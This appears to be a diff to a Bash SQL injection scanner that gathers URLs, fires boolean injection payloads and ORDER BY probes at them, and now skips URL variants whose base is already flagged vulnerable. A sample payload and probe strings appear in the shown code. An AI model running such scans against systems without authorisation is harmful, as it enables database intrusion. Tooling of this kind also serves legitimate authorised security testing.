@@ -151,7 +151,7 @@ add_number_variations() {
         [[ -z "$url" ]] && continue
         # Check if URL already ends with a number
         if [[ "$url" =~ /[0-9]+$ ]]; then
-            echo "This URL ends with number $url"
+            echo "$url"
             continue
         fi
         # Check if URL ends with any exception word
@@ -183,7 +183,6 @@ collect_urls() {
     | uro \
     | grep -Ev '\.(js|tsx|php|html|htm)(\?|$)' \
     | sed 's/=[^&[:space:]]*/=/'
-    | sed 's/:id//'
 }
 
 # ---------------- Curl helper ----------------
@@ -235,6 +234,13 @@ test_payload() {
     fi
     echo "false"
   fi
+}
+
+# ---------------- Function to get base URL without trailing number ----------------
+get_base_url() {
+  local url="$1"
+  # Remove trailing /number pattern
+  echo "$url" | sed -E 's|(/[0-9]+)+$||'
 }
 
 # ---------------- INITIALIZE ---------------
@@ -326,8 +332,23 @@ declare -a payloads=(
   "1%20AND%202=1/*comment*/--"
 )
 
+# Track vulnerable base URLs to avoid duplicate checks
+declare -A vulnerable_bases=()
+
 while IFS= read -r url; do
   [[ -z "$url" ]] && continue
+  
+  # Get base URL (without trailing /number)
+  base_url=$(get_base_url "$url")
+  
+  # Skip if this base URL is already marked as vulnerable
+  if [[ -n "${vulnerable_bases[$base_url]}" ]]; then
+    if [[ "$verbose" == true ]]; then
+      echo -e "${YELLOW}[*] Skipping $url (base URL $base_url already marked as vulnerable)${NC}" 1>&2
+    fi
+    continue
+  fi
+  
   vulnerable=false
 
   # ---- Stage 0: False positive response check (FIRST check before anything else)
@@ -359,7 +380,7 @@ while IFS= read -r url; do
 
   # Test all payloads
   if [[ "$verbose" == true ]]; then
-    echo -e "${BLUE}[*] Testing boolean injection payloads...${NC}" 1>&2
+    echo -e "${BLUE}[*] Testing boolean injection payloads for $url...${NC}" 1>&2
   fi
 
   for payload in "${payloads[@]}"; do
@@ -387,6 +408,8 @@ while IFS= read -r url; do
     done
     
     vulnerable=true
+    # Mark this base URL as vulnerable to skip future variations
+    vulnerable_bases["$base_url"]=1
     
     # Run additional tests
     if [[ -n "$header" ]]; then
@@ -414,6 +437,8 @@ while IFS= read -r url; do
         echo -e "Payload: ${YELLOW}${url}/ order by ${i}-- -${NC}"
         echo -e "Reason: ${BLUE}ORDER BY error at column $i (response: $response_code)${NC}"
         vulnerable=true
+        # Mark this base URL as vulnerable to skip future variations
+        vulnerable_bases["$base_url"]=1
         
         # Run additional tests
         if [[ -n "$header" ]]; then
